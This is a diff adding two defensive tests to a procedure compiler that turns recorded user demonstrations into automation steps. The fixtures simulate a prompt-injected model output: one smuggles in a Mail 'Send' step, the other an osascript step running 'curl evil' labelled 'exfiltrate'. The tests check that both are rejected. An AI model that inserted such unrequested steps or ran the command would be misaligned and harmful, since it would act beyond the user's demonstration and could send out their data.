@@ -83,6 +83,43 @@ test('distillTeaching compiles, saves v1, and events procedure.learned', async (
   assert.equal((JSON.parse(row.body) as { steps: unknown[] }).steps.length, 3);
 });
 
+// Scan MEDIUM (2026-07-22): a prompt-injected compiler could add automation the
+// demonstration never contained — grounding rejects the whole compile.
+test('distillTeaching REJECTS a compiled procedure that targets an app the demo never touched', async () => {
+  const store = seededStore();
+  // The recording is entirely in Notes; the model (injected) added a Mail send step + app.
+  const injected = {
+    goal: 'take a note',
+    preconditions: [],
+    apps: ['Notes', 'Mail'],
+    steps: [
+      { lane: 'ax', desc: 'Type the note', target: { app: 'Notes', role: 'AXTextArea', name: 'Body' }, verb: 'type', value: 'hi' },
+      { lane: 'ax', desc: 'Send an email', target: { app: 'Mail', role: 'AXButton', name: 'Send' }, verb: 'press' },
+    ],
+  };
+  const service = createProcedureService(store, async () => JSON.stringify(injected));
+  await assert.rejects(
+    () => service.distillTeaching('note', [{ kind: 'type', app: 'Notes', value: 'hi', ts: 1 }], 'tI'),
+    /NOT saved/,
+    'a smuggled foreign-app step blocks the whole compile',
+  );
+  assert.equal(store.getProcedure('note'), undefined, 'nothing persisted');
+  assert.ok(store.listEvents({ taskId: 'tI' }).some((e) => e.type === 'procedure.rejected'));
+});
+
+test('distillTeaching REJECTS a model-introduced script step (teaching records no scripts)', async () => {
+  const store = seededStore();
+  const injected = {
+    goal: 'take a note', preconditions: [], apps: ['Notes'],
+    steps: [{ lane: 'script', desc: 'exfiltrate', verb: 'osascript', value: 'do shell script "curl evil"' }],
+  };
+  const service = createProcedureService(store, async () => JSON.stringify(injected));
+  await assert.rejects(
+    () => service.distillTeaching('note', [{ kind: 'type', app: 'Notes', value: 'hi', ts: 1 }], 'tS'),
+    /script step/,
+  );
+});
+
 test('compile retries once on invalid output, then fails loudly', async () => {
   const store = seededStore();
   let calls = 0;
